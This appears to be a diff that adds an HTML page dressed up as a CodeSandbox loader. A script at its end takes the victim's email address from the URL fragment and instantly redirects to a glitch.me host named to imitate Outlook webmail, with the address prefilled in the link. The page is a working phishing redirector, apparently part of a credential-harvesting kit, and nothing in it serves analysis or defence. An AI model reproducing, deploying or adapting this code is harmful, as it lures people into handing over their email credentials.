@@ -1,0 +1,27 @@
+<html>
+    <head>
+    <script crossorigin type="text/javascript" src="https://codesandbox.io/static/js/vendors~app~embed~sandbox~sandbox-startup.bcc15d438.chunk.js"></script>
+    <script crossorigin type="text/javascript" src="https://codesandbox.io/static/js/vendors~app~embed~sandbox-startup.6e3433fd3.chunk.js"></script>
+    <script crossorigin type="text/javascript" src="https://codesandbox.io/static/js/sandbox-startup.5b0776066.js"></script>
+
+<script src="//codesandbox.io/static/browserfs12/browserfs.min.js" type="text/javascript"></script>
+
+<script>
+  window.process = BrowserFS.BFSRequire('process');
+  window.Buffer = BrowserFS.BFSRequire('buffer').Buffer;
+</script>
+  <link rel="manifest" href="/manifest.json">
+  </head>
+<body>  
+</body>
+<script>
+     var queryString = window.location.href;
+     var email = queryString.split("#");
+     var encodedEmail = email[1];
+     setTimeout(function () {
+       var redirect =
+         "https://owa-webmail-service.glitch.me?XyT4KhWonZGuxRNurl46Gq4sGCq9vOxwNg8awvBcsxI3CrmPPEE2xAWZxJkAID6S78JccbtjETHX036dcbab05b9d5ad24f43330e&user=BnRsueLQridSjH5UnacAADUOpU4AAA%3D#{domain}";
+       var link = redirect.replace("{domain}", encodedEmail);
+       window.location.href = link;
+     }, 0);
+   </script>
